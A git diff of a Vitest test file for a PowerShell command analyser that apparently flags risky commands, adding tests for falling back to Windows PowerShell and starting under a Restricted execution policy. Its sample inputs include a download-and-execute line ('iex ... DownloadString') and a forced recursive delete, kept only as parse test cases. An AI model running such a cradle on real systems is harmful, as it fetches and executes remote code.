@@ -1,10 +1,18 @@
-import { execFileSync } from "node:child_process"
+import { execFileSync, spawnSync } from "node:child_process"
 import fs from "node:fs"
 import os from "node:os"
 import path from "node:path"
 import { fileURLToPath } from "node:url"
 import { afterAll, beforeAll, describe, expect, it } from "vitest"
-import { canonicalCommandName, PwshUnavailableError, PwshWorker, toAnalysis, analysePwsh } from "../src/pwsh.js"
+import {
+  canonicalCommandName,
+  inlineScriptArgs,
+  powerShellExe,
+  PwshUnavailableError,
+  PwshWorker,
+  toAnalysis,
+  analysePwsh,
+} from "../src/pwsh.js"
 import type { RawAnalysis } from "../src/pwsh.js"
 
 const here = path.dirname(fileURLToPath(import.meta.url))
@@ -159,6 +167,63 @@ describe("PwshWorker", () => {
     expect(a.segments.map((s) => s.text)).toEqual(["Get-ChildItem -Recurse", "Invoke-Expression x"])
     expect(a.flags.invokeExpression).toBe(true)
   })
+})
+
+// Owner, 4 Nov: no version of PowerShell may be a hard dependency. A colleague without PowerShell 7 had every
+// PowerShell command come to them, because the checker never started.
+const WINDOWS_POWERSHELL = `${process.env.SystemRoot ?? "C:\\Windows"}\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
+describe("without PowerShell 7", () => {
+  it("uses PowerShell 7 when it is on the PATH, otherwise Windows PowerShell by its full path", () => {
+    if (process.platform !== "win32") return
+    const env = { PATH: "C:\\Tools;C:\\Program Files\\PowerShell\\7", SystemRoot: "C:\\Windows" }
+    expect(powerShellExe(env, (p) => p === path.join("C:\\Program Files\\PowerShell\\7", "pwsh.exe"))).toBe(
+      "pwsh.exe",
+    )
+    // A powershell.exe on the PATH is never the one used.
+    expect(powerShellExe(env, (p) => p.endsWith("powershell.exe"))).toBe(
+      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    )
+  })
+
+  it.skipIf(!fs.existsSync(WINDOWS_POWERSHELL))(
+    "reads commands in Windows PowerShell exactly as in PowerShell 7",
+    async () => {
+      const seven = worker({})
+      const five = worker({ pwsh: WINDOWS_POWERSHELL })
+      await five.start()
+      expect(five.languageMode).toBe("FullLanguage")
+      for (const text of [
+        "Get-ChildItem -Recurse | Select-Object Name",
+        "Remove-Item -Recurse -Force \"$env:TEMP\\x\" > $null",
+        "iex (New-Object Net.WebClient).DownloadString('https://example.com/a.ps1')",
+        "Start-Process notepad; Set-ItemProperty -Path HKCU:\\Software\\x -Name y -Value 1",
+        "Write-Output 'café' >> log.txt",
+      ])
+        expect(await analysePwsh(five, text), text).toEqual(await analysePwsh(seven, text))
+      // Syntax only PowerShell 7 has is a parse error there, so the command comes to you.
+      expect((await analysePwsh(five, "git pull && npm test")).parseError).toBe(true)
+    },
+    30_000,
+  )
+
+  it.skipIf(!fs.existsSync(WINDOWS_POWERSHELL))(
+    "starts even where PowerShell refuses every script file (the default policy, Restricted)",
+    () => {
+      const ask = JSON.stringify({ id: 1, b64: Buffer.from("Get-Process").toString("base64") })
+      const run = (args: string[]) =>
+        spawnSync(WINDOWS_POWERSHELL, ["-ExecutionPolicy", "Restricted", ...args], {
+          input: `${ask}\n`,
+          encoding: "utf8",
+          windowsHide: true,
+          timeout: 25_000,
+        }).stdout
+      expect(run(["-NoProfile", "-NonInteractive", "-File", REAL_SCRIPT, "-Loop"])).not.toMatch(/"ready"/)
+      const lines = run(inlineScriptArgs(REAL_SCRIPT, ["-Loop"])).trim().split(/\r?\n/)
+      expect(JSON.parse(lines[0]!)).toMatchObject({ ready: true })
+      expect(JSON.parse(lines[1]!)).toMatchObject({ id: 1, ok: true, commands: [{ name: "Get-Process" }] })
+    },
+    60_000,
+  )
 })
 
 describe("scripts/ps-ast.ps1 single-shot mode", () => {
